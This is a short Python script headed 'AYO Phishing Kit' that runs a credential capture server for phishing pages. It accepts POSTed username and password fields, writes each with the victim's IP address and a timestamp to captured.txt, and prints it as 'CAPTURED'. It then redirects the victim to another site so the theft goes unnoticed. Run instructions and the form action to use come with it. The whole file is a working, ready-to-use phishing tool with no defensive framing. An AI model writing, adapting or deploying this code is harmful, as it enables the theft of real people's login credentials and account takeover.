#!/usr/bin/env python3
# AYO Phishing Kit — Python capture server (no PHP needed)
# Run: python3 capture_server.py
# Then set form action="http://localhost:8080/capture"

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse
import datetime

LOG_FILE = "captured.txt"

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass  # suppress default logs

    def do_POST(self):
        if "/capture" in self.path:
            length = int(self.headers.get("Content-Length", 0))
            body   = self.rfile.read(length).decode()
            params = parse_qs(body)
            user   = params.get("username", [""])[0]
            pw     = params.get("password", [""])[0]
            ip     = self.client_address[0]
            ts     = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry  = f"[{ts}] IP: {ip} | User: {user} | Pass: {pw}\n"
            with open(LOG_FILE, "a") as f:
                f.write(entry)
            print(f"\033[91m[CAPTURED]\033[0m {entry.strip()}")
            self.send_response(302)
            self.send_header("Location", "https://example.com")
            self.end_headers()

if __name__ == "__main__":
    print("\033[91m[AYO]\033[0m Capture server running on http://localhost:8080")
    print("\033[90mLog file: captured.txt\033[0m")
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
